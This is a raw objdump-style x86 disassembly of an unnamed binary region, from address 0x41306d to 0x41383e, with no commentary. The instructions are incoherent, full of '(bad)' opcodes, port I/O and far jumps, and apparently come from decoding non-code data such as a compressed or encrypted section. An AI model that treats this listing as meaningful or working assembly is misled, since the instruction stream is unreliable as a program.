  41306d:	xor    eax,DWORD PTR [ebp+ebp*2-0x53]
  413071:	xchg   BYTE PTR [esi],al
  413073:	js     0x413082
  413075:	inc    esp
  413076:	ror    edi,cl
  413078:	jns    0x41306e
  41307a:	retf   0xa1de
  41307d:	jbe    0x413045
  41307f:	rep stos DWORD PTR es:[edi],eax
  413081:	bound  eax,QWORD PTR [esi]
  413083:	mov    ?,WORD PTR [eax-0x19571d18]
  413089:	(bad)  [ebx]
  41308b:	sbb    al,0x2a
  41308d:	dec    ebp
  41308e:	popf   
  41308f:	repz push cs
  413091:	adc    eax,0x641feb71
  413096:	jo     0x4130d6
  413098:	and    eax,0x24993837
  41309d:	(bad)  
  41309e:	iret   
  41309f:	sbb    ebp,DWORD PTR [edi+ecx*4]
  4130a2:	shl    BYTE PTR [ebp-0x1795231a],0x73
  4130a9:	mov    ds:0x3b767a5b,al
  4130ae:	lds    ebx,FWORD PTR ds:[edx]
  4130b1:	mov    eax,0xb21eb138
  4130b6:	lea    edx,[esi+0x59]
  4130b9:	adc    ebp,DWORD PTR [ebx-0x75dc38d3]
  4130bf:	jle    0x4130d6
  4130c1:	adc    al,0x92
  4130c3:	mov    eax,0x2b1e1b2e
  4130c8:	pop    ecx
  4130c9:	push   ebx
  4130ca:	test   al,0x5c
  4130cc:	das    
  4130cd:	cmp    BYTE PTR [ecx+0x4046f656],0xa7
  4130d4:	jne    0x41313d
  4130d6:	cli    
  4130d7:	(bad)  
  4130d8:	pusha  
  4130d9:	inc    ebp
  4130da:	sub    al,ah
  4130dc:	lahf   
  4130dd:	and    ah,BYTE PTR [edx+0x1a9eda7c]
  4130e3:	fcomp  QWORD PTR [edi]
  4130e5:	xchg   ebp,eax
  4130e6:	xor    al,dh
  4130e8:	lock mov esi,0x3d583e1
  4130ee:	inc    eax
  4130ef:	mov    eax,0xbaa58971
  4130f4:	push   esp
  4130f5:	or     al,0xec
  4130f7:	xlat   BYTE PTR ds:[ebx]
  4130f8:	ficomp DWORD PTR [esi+ebp*1-0x238dc805]
  4130ff:	lods   al,BYTE PTR ds:[esi]
  413100:	out    0x6f,al
  413102:	push   0xad977398
  413107:	popa   
  413108:	dec    esp
  413109:	dec    esi
  41310a:	mov    bh,0xa9
  41310c:	xchg   bp,ax
  41310e:	icebp  
  41310f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  413111:	lods   eax,DWORD PTR ds:[esi]
  413112:	cmp    BYTE PTR [eax+0x69],dl
  413115:	add    eax,0x1729241
  41311a:	scas   eax,DWORD PTR es:[edi]
  41311b:	sbb    al,BYTE PTR [ebx+0x118337c7]
  413121:	mov    WORD PTR [ecx],fs
  413123:	push   0xffffffa8
  413125:	jmp    0xe5e8:0xd3d5a60a
  41312c:	mov    dh,0x5a
  41312e:	sbb    edx,DWORD PTR [eax]
  413130:	mov    ebx,0x71d0cba6
  413135:	lahf   
  413136:	pushf  
  413137:	sar    BYTE PTR [ebx+0xf],cl
  41313a:	test   al,0xcc
  41313c:	sbb    eax,0x920cfa31
  413141:	mov    DWORD PTR [eax],ebp
  413143:	mov    edi,0xee26869b
  413148:	mov    al,0x9d
  41314a:	xor    BYTE PTR [edx-0x31],bh
  41314d:	jb     0x4130d2
  41314f:	mov    bh,0x73
  413151:	repz pop ss
  413153:	jo     0x4130fa
  413155:	and    al,0x95
  413157:	xor    DWORD PTR [esi+0x4fc4fd8a],0xe0ef9266
  413161:	add    DWORD PTR [edx-0x3cf556cf],eax
  413167:	xchg   esp,eax
  413168:	ja     0x41313b
  41316a:	mov    ds:0x86c9a00d,al
  41316f:	mov    al,ds:0x12276fdb
  413174:	jb     0x413171
  413176:	adc    BYTE PTR [edx+0x303f39eb],ah
  41317c:	or     bl,dh
  41317e:	shr    BYTE PTR [esp+ebp*8],0x1a
  413182:	mov    ebx,edi
  413184:	jecxz  0x413120
  413186:	mov    edi,0x76a3f404
  41318b:	jl     0x4131f0
  41318d:	add    DWORD PTR [edx+0x5e],ecx
  413190:	test   al,0x84
  413192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413193:	push   ebx
  413194:	xor    ebp,DWORD PTR [esi-0x15]
  413197:	iret   
  413198:	mov    edx,0x83354be1
  41319d:	dec    ebp
  41319e:	sbb    ah,BYTE PTR [edi]
  4131a0:	imul   ecx,esi,0xffffff88
  4131a3:	retf   
  4131a4:	push   cs
  4131a5:	outs   dx,DWORD PTR ds:[esi]
  4131a6:	les    edi,FWORD PTR [ebx+0x784b881a]
  4131ac:	sbb    al,0x7e
  4131ae:	in     al,0xc5
  4131b0:	arpl   dx,di
  4131b2:	inc    ebx
  4131b3:	pop    ebp
  4131b4:	mov    dh,0x9b
  4131b6:	stc    
  4131b7:	jno    0x413226
  4131b9:	fbstp  TBYTE PTR [edi]
  4131bb:	sbb    al,0x23
  4131bd:	jns    0x4131a4
  4131bf:	and    edx,esi
  4131c1:	lock jae 0x413204
  4131c4:	sub    ebp,esp
  4131c6:	ficom  DWORD PTR [ebx+0x2935a348]
  4131cc:	daa    
  4131cd:	out    0x90,eax
  4131cf:	push   eax
  4131d0:	(bad)  
  4131d1:	jmp    0x4131ae
  4131d3:	out    0x30,eax
  4131d5:	(bad)  
  4131d7:	mov    DWORD PTR [esi],esp
  4131d9:	stos   DWORD PTR es:[edi],eax
  4131da:	push   cs
  4131db:	pop    edi
  4131dc:	in     eax,0xc5
  4131de:	loop   0x4131f2
  4131e0:	adc    bh,BYTE PTR [ecx+0x77c04340]
  4131e6:	jmp    0x914c:0xed8d3ee2
  4131ed:	cmp    dl,ah
  4131ef:	cli    
  4131f0:	inc    BYTE PTR [esi+0x1]
  4131f3:	(bad)  [edi]
  4131f5:	and    ecx,edx
  4131f7:	push   ss
  4131f8:	dec    ebx
  4131f9:	fbstp  TBYTE PTR [edi+0x78]
  4131fc:	out    dx,al
  4131fd:	jg     0x413270
  4131ff:	lock lock cmc 
  413202:	pop    ebx
  413203:	fstp   DWORD PTR [ebp-0x2c]
  413206:	pop    edi
  413207:	cmp    bl,0x89
  41320a:	cwde   
  41320b:	sbb    BYTE PTR [ebx-0x446fb6c2],ah
  413211:	jg     0x4131fa
  413213:	addr16 mov bh,0xd0
  413216:	sub    dh,BYTE PTR [edx]
  413218:	mov    ds:0x33fbe9c5,al
  41321d:	lods   al,BYTE PTR ds:[esi]
  41321e:	idiv   BYTE PTR ds:0xf5ce05e7
  413224:	fcomp  QWORD PTR [esi-0x68]
  413227:	ficom  DWORD PTR [esi]
  413229:	add    eax,0xc749da10
  41322e:	loopne 0x41326c
  413230:	xchg   ebp,eax
  413231:	jae    0x413242
  413233:	cmp    DWORD PTR ds:0xaecad75f,esi
  413239:	mov    al,ds:0xddfbba57
  41323e:	mov    ds:0xaa142efe,eax
  413243:	(bad)  
  413244:	jle    0x4131d4
  413246:	fwait
  413247:	mov    dl,0xbf
  413249:	mov    BYTE PTR [ebx+0x69],bh
  41324c:	ins    DWORD PTR es:[edi],dx
  41324d:	addr16 sub bh,bl
  413250:	xor    BYTE PTR [esi],bl
  413252:	dec    esp
  413253:	dec    ecx
  413254:	data16 (bad) 
  413257:	in     al,0xb6
  413259:	aam    0x73
  41325b:	fsubr  DWORD PTR [ebx-0x6c30d840]
  413261:	fadd   DWORD PTR [ecx+0x3f]
  413264:	cs pushf 
  413266:	inc    esp
  413267:	je     0x4132b3
  413269:	sahf   
  41326a:	stos   BYTE PTR es:[edi],al
  41326b:	mov    edi,ds
  41326d:	sti    
  41326e:	mov    eax,ds:0xeef15c0
  413273:	(bad)  
  413274:	pop    ecx
  413275:	mov    bh,0xa
  413277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413278:	inc    edi
  413279:	aaa    
  41327a:	or     eax,0x37111be7
  41327f:	mov    ecx,0xad2baade
  413284:	xor    bh,cl
  413286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413287:	hlt    
  413288:	ret    0xea8f
  41328b:	mov    ch,0xed
  41328d:	push   ebp
  41328e:	mov    al,dh
  413290:	stos   BYTE PTR es:[edi],al
  413291:	icebp  
  413292:	in     eax,dx
  413293:	and    DWORD PTR [edi+0x16],0xb518773d
  41329a:	xchg   DWORD PTR [edi-0x43],edi
  41329d:	pop    esp
  41329e:	cwde   
  41329f:	dec    ebx
  4132a0:	inc    edi
  4132a1:	xor    DWORD PTR [ebx-0x258d3401],0xf164d63b
  4132ab:	pop    DWORD PTR [ebp+0x27]
  4132ae:	mov    al,0xea
  4132b0:	mov    al,0xa7
  4132b2:	dec    ebx
  4132b3:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132b5:	std    
  4132b6:	xchg   ebx,eax
  4132b7:	sub    esp,esp
  4132b9:	lea    ebp,[ebx-0x30ba5054]
  4132bf:	mov    ebp,0x5f425caa
  4132c4:	xlat   BYTE PTR ds:[ebx]
  4132c5:	or     al,0xaa
  4132c7:	fld    TBYTE PTR [ebp*2+0x63333efd]
  4132ce:	leave  
  4132cf:	pop    es
  4132d0:	pop    ebx
  4132d1:	jb     0x413273
  4132d3:	xor    al,0x5b
  4132d5:	cmp    al,0x24
  4132d7:	(bad)  
  4132d8:	jmp    0x7787:0xd8622be5
  4132df:	sub    BYTE PTR [edi],bl
  4132e1:	sub    DWORD PTR [ecx+ebp*4+0x463e1a2f],edx
  4132e8:	das    
  4132e9:	std    
  4132ea:	repnz push ebx
  4132ec:	mov    cl,0x52
  4132ee:	cmp    DWORD PTR [ebx-0x4e462277],ebx
  4132f4:	(bad)  
  4132f5:	sahf   
  4132f6:	jmp    ebx
  4132f8:	push   cs
  4132f9:	xchg   ebx,eax
  4132fa:	mov    ebx,0xd8e3f7e3
  4132ff:	cmp    dh,BYTE PTR [esi+0x74c0b275]
  413305:	push   0x75
  413307:	push   eax
  413308:	add    eax,0x5ed2d0ee
  41330d:	sbb    DWORD PTR [eax-0x63a83659],ebp
  413313:	fdivrp st(5),st
  413315:	jecxz  0x41329c
  413317:	mov    eax,ds:0x7a98f9c1
  41331c:	dec    ecx
  41331d:	and    BYTE PTR [esi],bh
  41331f:	lds    edi,FWORD PTR [eax+0x48fe3552]
  413325:	daa    
  413326:	xor    al,0x83
  413328:	mov    esp,0x69293449
  41332d:	ror    edx,1
  41332f:	xchg   ebp,eax
  413330:	mov    dh,0x76
  413332:	cmp    eax,0x8fdaebae
  413337:	pop    ecx
  413338:	addr16 cmp edx,edi
  41333b:	jne    0x413354
  41333d:	fwait
  41333e:	dec    ebx
  41333f:	adc    eax,0x48120808
  413344:	or     dl,BYTE PTR [ebx+0x5c256cfc]
  41334a:	shl    esp,cl
  41334c:	test   al,0x6f
  41334e:	dec    edx
  41334f:	outs   dx,DWORD PTR ds:[esi]
  413350:	mov    ebp,0x52c8c3f8
  413355:	cmp    esp,DWORD PTR [ebx-0x4a]
  413358:	mov    esi,0x3075bbba
  41335d:	dec    edi
  41335e:	dec    edx
  41335f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413360:	sub    BYTE PTR [ecx+0x283675af],cl
  413366:	mov    ch,BYTE PTR ds:0x6998d768
  41336c:	sbb    DWORD PTR [esi-0x4b2f457f],ebp
  413372:	xchg   ebp,esi
  413374:	jo     0x4133b9
  413376:	jge    0x41330e
  413378:	repnz cmp eax,0x9bd4793f
  41337e:	test   al,0xb9
  413380:	mov    cl,0xff
  413382:	mov    ebx,0xc987dfb
  413387:	push   DWORD PTR [edi]
  413389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41338a:	lds    ebp,FWORD PTR [esp+eiz*8+0x1e14dcb]
  413391:	jg     0x413350
  413393:	and    DWORD PTR [ecx+edx*4+0x1b22eb81],esi
  41339a:	adc    DWORD PTR [esi],eax
  41339c:	aaa    
  41339d:	out    dx,eax
  41339e:	imul   dh
  4133a0:	leave  
  4133a1:	scas   al,BYTE PTR es:[edi]
  4133a2:	lods   eax,DWORD PTR ds:[esi]
  4133a3:	mov    bh,0xb7
  4133a5:	adc    bl,dh
  4133a7:	sub    eax,0x7a2a8dbf
  4133ac:	call   0x2787:0xd7d671b
  4133b3:	jae    0x4133cb
  4133b5:	jmp    0x55381857
  4133ba:	sbb    eax,0xf7382b2c
  4133bf:	dec    BYTE PTR [esi]
  4133c1:	or     al,0x5e
  4133c3:	popa   
  4133c4:	or     al,0x75
  4133c6:	sub    BYTE PTR [ecx+0xd699da5],dh
  4133cc:	in     eax,dx
  4133cd:	sub    BYTE PTR [eax+0x4ee98254],bl
  4133d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d4:	pop    ebp
  4133d5:	inc    ecx
  4133d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d7:	xor    edx,DWORD PTR [edx]
  4133d9:	inc    edx
  4133da:	aad    0xf6
  4133dc:	pop    edx
  4133dd:	adc    DWORD PTR [ebp+eiz*8+0x4c189c67],ecx
  4133e4:	out    dx,eax
  4133e5:	add    DWORD PTR [edx],ecx
  4133e7:	daa    
  4133e8:	in     al,dx
  4133e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ea:	push   0xffffff83
  4133ec:	adc    eax,0x44a5dbe7
  4133f1:	xchg   esi,eax
  4133f2:	out    0x38,eax
  4133f4:	and    DWORD PTR [edx+ecx*8+0x23],edx
  4133f8:	lea    eax,[ecx-0x2354ee0]
  4133fe:	lds    eax,FWORD PTR [edi]
  413400:	ret    0x5297
  413403:	sti    
  413404:	aam    0x36
  413406:	in     al,0xfd
  413408:	cs push esi
  41340a:	gs ins DWORD PTR es:[edi],dx
  41340c:	(bad)  
  41340d:	neg    DWORD PTR [ebp-0x6a63b8ab]
  413413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413414:	xor    al,0xf9
  413416:	sbb    BYTE PTR [esi],cl
  413418:	in     al,0x52
  41341a:	repnz aaa 
  41341c:	pusha  
  41341d:	xchg   esp,eax
  41341e:	mov    edx,0xa9b5865a
  413423:	add    eax,ecx
  413425:	pop    ebp
  413426:	neg    DWORD PTR [edi+0x5c36e1b6]
  41342c:	shr    BYTE PTR [esi-0x35],0x11
  413430:	(bad)
  413435:	jge    0x413447
  413437:	fcomp  st(3)
  413439:	fsubr  DWORD PTR [edx+0x3f]
  41343c:	add    ebp,DWORD PTR ds:0xadf3369b
  413442:	dec    ebp
  413443:	sub    eax,0xf6db66a1
  413448:	nop
  413449:	mov    bl,0x4a
  41344b:	in     eax,dx
  41344c:	and    DWORD PTR [ebx],esp
  41344e:	in     al,0xf9
  413450:	clc    
  413451:	cmp    DWORD PTR [ecx+0x45d29db1],edi
  413457:	out    dx,eax
  413458:	sub    BYTE PTR [ebx],bl
  41345a:	xor    BYTE PTR [edx],cl
  41345c:	outs   dx,BYTE PTR ds:[esi]
  41345d:	aam    0x96
  41345f:	into   
  413460:	(bad)  
  413461:	ins    BYTE PTR es:[edi],dx
  413462:	push   ecx
  413463:	out    dx,al
  413464:	retf   
  413465:	daa    
  413466:	mov    esi,0x1aceaf96
  41346b:	jecxz  0x413489
  41346d:	xor    edx,DWORD PTR [esi+0x2f]
  413470:	xchg   DWORD PTR [ecx],esi
  413472:	jmp    0xf01c4662
  413477:	jg     0x413476
  413479:	xchg   ebp,eax
  41347a:	aad    0x32
  41347c:	and    DWORD PTR [esi-0x5a005e2],ebp
  413482:	or     al,0x9b
  413484:	fiadd  DWORD PTR [eax]
  413486:	(bad)  
  413487:	lods   al,BYTE PTR ds:[esi]
  413488:	test   BYTE PTR [esi+0x4e51457f],0x49
  41348f:	in     al,0xb8
  413491:	xchg   ebx,eax
  413492:	pop    esp
  413493:	mov    bh,0xad
  413495:	mov    WORD PTR [edx],fs
  413497:	in     eax,dx
  413498:	clc    
  413499:	fiadd  WORD PTR [ecx+ebx*1]
  41349c:	or     eax,0xc3ea3c67
  4134a1:	inc    edx
  4134a2:	xchg   esp,eax
  4134a3:	and    BYTE PTR [esp+ebx*1],dl
  4134a6:	xchg   DWORD PTR [edi+0xe],esi
  4134a9:	mov    ch,0xe0
  4134ab:	push   ecx
  4134ac:	or     DWORD PTR [ebx+0x7f79ba5a],0x1b
  4134b3:	xchg   edx,eax
  4134b4:	push   esi
  4134b5:	out    0xcf,eax
  4134b7:	stc    
  4134b8:	in     eax,dx
  4134b9:	in     al,0xca
  4134bb:	cmp    BYTE PTR [eax+0x6aa2337c],0xec
  4134c2:	add    DWORD PTR [ecx+0x46c316e2],0x40
  4134c9:	mov    ah,0x1e
  4134cb:	jmp    0x87954c4d
  4134d0:	std    
  4134d1:	push   0xad7433a1
  4134d6:	and    bl,bh
  4134d8:	pop    es
  4134d9:	in     al,dx
  4134da:	sti    
  4134db:	sub    DWORD PTR [eax],0x3
  4134de:	sub    cl,BYTE PTR [edx+0x3]
  4134e1:	je     0x4134cb
  4134e3:	arpl   WORD PTR [edx],ax
  4134e5:	sbb    bh,BYTE PTR [edx+0x39d35f96]
  4134eb:	add    DWORD PTR [ebx+0x12],edi
  4134ee:	in     eax,dx
  4134ef:	fucomi st,st(6)
  4134f1:	sub    eax,0x64c0f582
  4134f6:	xchg   BYTE PTR [ecx+0x2131a5fc],dl
  4134fc:	jne    0x4134bd
  4134fe:	in     eax,0xc
  413500:	out    dx,al
  413501:	xchg   edi,eax
  413502:	adc    eax,0xce6e29bd
  413507:	inc    esi
  413508:	arpl   si,cx
  41350a:	inc    edi
  41350b:	enter  0xecc3,0xfe
  41350f:	cvttps2pi mm2,QWORD PTR [ecx-0x6d058077]
  413516:	sub    ch,BYTE PTR [edi+0x786ff97d]
  41351c:	fs sti 
  41351e:	rcr    DWORD PTR [esi],cl
  413520:	jecxz  0x413590
  413522:	aas    
  413523:	and    DWORD PTR [edi],edx
  413525:	add    al,0x1a
  413527:	retf   0x75f5
  41352a:	sub    DWORD PTR [eax-0x26b46c63],esp
  413530:	mov    edx,0x40d06ef9
  413535:	jbe    0x4134d6
  413537:	nop
  413538:	sahf   
  413539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353a:	push   ss
  41353b:	test   al,0x6b
  41353d:	adc    al,0x4a
  41353f:	(bad)  
  413541:	mov    gs,ebx
  413543:	int    0x1e
  413545:	push   esp
  413546:	adc    al,0x1a
  413548:	dec    esi
  413549:	loope  0x413556
  41354b:	test   DWORD PTR [esp+edx*1],esp
  41354e:	sahf   
  41354f:	popf   
  413550:	dec    ecx
  413551:	out    0xfd,eax
  413553:	dec    esi
  413554:	out    0x46,eax
  413556:	ficom  WORD PTR [eax]
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41355a:	pusha  
  41355b:	popf   
  41355c:	aam    0x82
  41355e:	mov    dl,0xbd
  413560:	add    ecx,DWORD PTR [eax+0xb68e40e]
  413566:	sahf   
  413567:	mov    dh,0xf2
  413569:	add    DWORD PTR [edi-0x2cbb9567],0x2ca7414a
  413573:	leave  
  413574:	(bad)  
  413575:	loop   0x413598
  413577:	aaa    
  413578:	data16 mov dh,0x9b
  41357b:	retf   
  41357c:	repz cmp BYTE PTR [edx],ch
  41357f:	sar    bh,cl
  413581:	sbb    BYTE PTR [edx+0x43],bl
  413584:	or     al,0xe5
  413586:	dec    edi
  413587:	in     al,dx
  413588:	(bad)
  41358c:	mov    edi,0x5ddee3be
  413591:	sar    edi,0x7a
  413594:	add    al,0xe
  413596:	mov    ds:0x51ed012e,al
  41359b:	jnp    0x4135ff
  41359d:	scas   al,BYTE PTR es:[edi]
  41359e:	xchg   ch,dh
  4135a0:	not    DWORD PTR [esi+0x49]
  4135a3:	fnstcw WORD PTR [ecx+0x42]
  4135a6:	mov    ebp,0x26d744e1
  4135ab:	shl    DWORD PTR [ebp-0x4],0x60
  4135af:	pop    ebp
  4135b0:	jecxz  0x413564
  4135b2:	in     eax,0xff
  4135b4:	cmp    BYTE PTR [ebx],dh
  4135b6:	push   cs
  4135b7:	mov    bh,0xa0
  4135b9:	adc    ebp,0x41
  4135bc:	push   es
  4135bd:	inc    edi
  4135be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135bf:	adc    eax,0xdb7aa9b6
  4135c4:	sub    esi,DWORD PTR [ebx]
  4135c6:	jbe    0x4135f5
  4135c8:	popf   
  4135c9:	lds    esp,FWORD PTR [edi]
  4135cb:	loope  0x4135ce
  4135cd:	arpl   bx,si
  4135cf:	mov    dh,0xd1
  4135d1:	and    BYTE PTR ss:[edx],bh
  4135d4:	(bad)  
  4135d5:	les    ebp,FWORD PTR [edx-0x5c2b9f0c]
  4135db:	sbb    ch,al
  4135dd:	dec    ecx
  4135de:	sti    
  4135df:	sub    DWORD PTR [eax-0x55b5e94f],esp
  4135e5:	mov    bh,0x20
  4135e7:	(bad)  
  4135e9:	mov    dl,0xcb
  4135eb:	jge    0x413614
  4135ed:	and    BYTE PTR [ebx+eax*4-0x1c],ch
  4135f1:	rcl    DWORD PTR [ecx-0x7d],0xe5
  4135f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f6:	int3   
  4135f7:	sub    dh,ch
  4135f9:	xchg   BYTE PTR [ebp*4-0x3c38d9f7],ah
  413600:	mov    WORD PTR [ebp-0x7654f26],?
  413606:	push   edi
  413607:	xlat   BYTE PTR ds:[ebx]
  413608:	sub    eax,ebp
  41360a:	sub    al,0xe5
  41360c:	jge    0x413661
  41360e:	ss jnp 0x4135ea
  413611:	adc    ah,ch
  413613:	pop    ebx
  413614:	test   al,0xbd
  413616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413617:	repz jl 0x413665
  41361a:	je     0x413676
  41361c:	adc    DWORD PTR [edx-0x38],edx
  41361f:	repz push ds
  413621:	ficom  WORD PTR [ebx+0x4830ee6f]
  413627:	retf   
  413628:	aad    0xa
  41362a:	or     eax,DWORD PTR [ebx-0x5fd0f484]
  413630:	stos   BYTE PTR es:[edi],al
  413631:	fisttp DWORD PTR [ebx+0x75]
  413634:	xchg   bh,bl
  413636:	out    dx,al
  413637:	cmc    
  413638:	fucom  st(4)
  41363a:	cs pop es
  41363c:	or     bl,cl
  41363e:	fild   WORD PTR [edx]
  413640:	mov    ebx,0x2e936884
  413645:	inc    eax
  413646:	dec    edi
  413647:	mov    dl,0xc0
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	or     esp,DWORD PTR [eax+0x70fb09e9]
  413650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413651:	loopne 0x413685
  413653:	jg     0x413692
  413655:	nop
  413656:	mov    ecx,0x31e785d5
  41365b:	(bad)  [edi]
  41365d:	in     eax,0x9f
  41365f:	sub    BYTE PTR [ebx-0x5507e171],al
  413665:	adc    al,0x2b
  413667:	fdivr  DWORD PTR [esi-0x361a95c7]
  41366d:	push   ds
  41366e:	shr    DWORD PTR ds:0x927c0da,0x98
  413675:	jb     0x413616
  413677:	(bad)  
  413679:	sub    dh,bh
  41367b:	in     eax,0x7f
  41367d:	scas   al,BYTE PTR es:[edi]
  41367e:	xchg   ebx,eax
  41367f:	jmp    0xe331:0xdb1429c7
  413686:	jns    0x4136c2
  413688:	mov    edx,0xe51039d3
  41368d:	or     al,BYTE PTR [ebp-0x3b]
  413690:	jb     0x41365e
  413692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413693:	and    edx,0x12ef8bb0
  413699:	cmp    ebx,esi
  41369b:	add    al,0x7f
  41369d:	and    BYTE PTR [edi+edi*2-0x23],0xe
  4136a2:	sub    dh,dl
  4136a4:	es iret 
  4136a6:	es ds fcomip st,st(0)
  4136aa:	iret   
  4136ab:	xor    BYTE PTR [ecx+eiz*2],dh
  4136ae:	lods   eax,DWORD PTR ds:[esi]
  4136af:	aas    
  4136b0:	mov    esi,ecx
  4136b2:	das    
  4136b3:	sbb    bl,bl
  4136b5:	imul   ebp,DWORD PTR [esi],0x2a2b60e5
  4136bb:	jbe    0x413712
  4136bd:	outs   dx,BYTE PTR ds:[esi]
  4136be:	leave  
  4136bf:	jo     0x413710
  4136c1:	je     0x413644
  4136c3:	call   0xc56fc80f
  4136c8:	in     eax,0xa0
  4136ca:	call   0xf3275cdb
  4136cf:	leave  
  4136d0:	mov    ss,edi
  4136d2:	mov    edx,0x2a0b90f1
  4136d7:	daa    
  4136d8:	add    DWORD PTR [esi+0x3ee0471c],0xfffffff5
  4136df:	jl     0x413686
  4136e1:	adc    DWORD PTR [ecx+0x3515e47f],ebp
  4136e7:	iretw  
  4136e9:	loope  0x413690
  4136eb:	inc    esp
  4136ec:	ret    0x84a6
  4136ef:	out    dx,eax
  4136f0:	enter  0x4597,0xca
  4136f4:	jno    0x4136bb
  4136f6:	aam    0x90
  4136f8:	sub    al,0xad
  4136fa:	lahf   
  4136fb:	out    0xcb,al
  4136fd:	gs mov bl,0xa
  413700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413701:	jmp    0xd087c1ff
  413706:	jg     0x4136d3
  413708:	jmp    0x413763
  41370a:	jge    0x4136f5
  41370c:	push   0x60ed4be5
  413711:	mov    ds:0xb2f0142,eax
  413716:	sub    DWORD PTR [ecx-0x46342d89],edi
  41371c:	push   cs
  41371d:	cmp    al,0x76
  41371f:	setb   BYTE PTR [ebp+0x3375dfc7]
  413726:	out    0xbc,al
  413728:	jnp    0x413743
  41372a:	cmp    eax,ebx
  41372c:	fwait
  41372d:	xor    al,0x97
  41372f:	pop    ecx
  413730:	sti    
  413731:	ficom  DWORD PTR [esi-0x42]
  413734:	or     cl,ch
  413736:	add    edi,DWORD PTR [edx+0x541b700a]
  41373c:	cmp    DWORD PTR [ebx+0x5a],ecx
  41373f:	loopne 0x413729
  413741:	ja     0x413723
  413743:	mov    edx,0x135293cf
  413748:	rcr    DWORD PTR [ebp+ecx*4-0x30d57a32],cl
  41374f:	mov    ds:0xf52bc7f5,eax
  413754:	cmp    al,0x85
  413756:	sub    BYTE PTR [esi],dl
  413758:	xchg   ecx,eax
  413759:	xchg   BYTE PTR [ebp-0x5a],bh
  41375c:	inc    edi
  41375d:	mov    ds:0x7e7e85b8,eax
  413762:	add    eax,0x26e26d97
  413767:	nop
  413768:	dec    esp
  413769:	inc    ecx
  41376a:	pop    es
  41376b:	stos   BYTE PTR es:[edi],al
  41376c:	inc    ebx
  41376d:	imul   ebx,DWORD PTR [edi],0x33148057
  413773:	je     0x4137ac
  413775:	inc    ebp
  413776:	jns    0x413703
  413778:	inc    esi
  413779:	ins    DWORD PTR es:[edi],dx
  41377a:	(bad)  
  41377c:	and    BYTE PTR [edx+eiz*1+0x1e898925],cl
  413783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413784:	in     al,0xc3
  413786:	mul    BYTE PTR [edi]
  413788:	cld    
  413789:	(bad)  
  41378a:	daa    
  41378b:	sbb    DWORD PTR [ebx],edx
  41378d:	and    al,0x1d
  41378f:	mov    DWORD PTR [ecx-0x1a410273],edi
  413795:	cmp    ch,ch
  413797:	mov    edx,0x4707e679
  41379c:	adc    DWORD PTR [edx+edx*8],esi
  41379f:	sbb    esi,DWORD PTR cs:[eax+ebx*2+0x19]
  4137a4:	retf   
  4137a5:	rcr    DWORD PTR ds:0x3e9e60ef,cl
  4137ab:	(bad)  
  4137ac:	stc    
  4137ad:	lahf   
  4137ae:	mov    ecx,0x91a5acba
  4137b3:	retf   
  4137b4:	mov    bl,0x34
  4137b6:	xchg   edx,eax
  4137b7:	pop    es
  4137b8:	in     eax,dx
  4137b9:	lahf   
  4137ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137bb:	loope  0x4137fc
  4137bd:	and    edx,edx
  4137bf:	test   DWORD PTR [esi-0x6c],ebp
  4137c2:	add    bl,bh
  4137c4:	add    edi,DWORD PTR [edi]
  4137c6:	xchg   BYTE PTR [esi+0x63750c85],dh
  4137cc:	xor    eax,0xa904e3b
  4137d1:	add    al,0xe
  4137d3:	push   ecx
  4137d4:	push   ds
  4137d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137d6:	cmp    BYTE PTR [edi+0x71b1eb6b],ah
  4137dc:	pushf  
  4137dd:	jb     0x41382c
  4137df:	pushf  
  4137e0:	ret    
  4137e1:	or     al,0x7
  4137e3:	xchg   DWORD PTR [esi],ecx
  4137e5:	push   ds
  4137e6:	ds out dx,al
  4137e8:	fwait
  4137e9:	fwait
  4137ea:	pop    esp
  4137eb:	inc    ebx
  4137ec:	lods   al,BYTE PTR ds:[esi]
  4137ed:	xor    al,0x47
  4137ef:	push   ebx
  4137f0:	cli    
  4137f1:	jbe    0x41379e
  4137f3:	mov    dl,0x13
  4137f5:	clc    
  4137f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137f7:	mov    dh,0xd1
  4137f9:	ret    0xbe3d
  4137fc:	jl     0x4137dd
  4137fe:	mov    ebp,DWORD PTR [ebp+0x6a769132]
  413804:	in     eax,0x21
  413806:	jecxz  0x413882
  413808:	sti    
  413809:	ret    
  41380a:	sbb    edi,DWORD PTR [esi]
  41380c:	jo     0x413819
  41380e:	or     ah,ch
  413810:	pop    ss
  413811:	enter  0x1379,0xec
  413815:	fcmovne st,st(7)
  413817:	mov    esp,0xd1226ef6
  41381c:	and    eax,0x7f92899a
  413821:	mov    bl,0x63
  413823:	fwait
  413824:	aas    
  413825:	add    bh,ch
  413827:	jmp    0x4137c7
  413829:	push   ss
  41382a:	adc    eax,0xcadd565e
  41382f:	jae    0x4137f6
  413831:	add    DWORD PTR [ecx],0xffffff9b
  413834:	and    BYTE PTR ds:[edx-0x3a],dl
  413838:	sub    al,0xa8
  41383a:	mov    ch,ch
  41383c:	jo     0x413820
  41383e:	mov    ebp,0x67e7e13e
